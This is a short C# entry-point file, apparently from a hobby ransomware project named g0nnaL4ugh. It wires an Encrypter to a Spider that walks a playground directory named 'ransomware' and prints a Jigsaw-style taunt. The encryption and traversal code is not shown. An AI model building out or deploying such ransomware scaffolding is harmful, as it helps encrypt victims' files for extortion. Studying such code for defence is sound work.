using System;
using g0nnaL4ugh.Crypto;

namespace g0nnaL4ugh
{
    class Program
    {
        public static void Main(string[] args)
        {
            Encrypter encrypter = new Encrypter();
            string[] paths = { "/home/giwiro/Playground/ransomware" };
            Spider spider = new Spider(paths, encrypter);
            spider.BuildNodesFromPath();
            Console.WriteLine("Wann4 play a G4m3?");
        }
    }
}
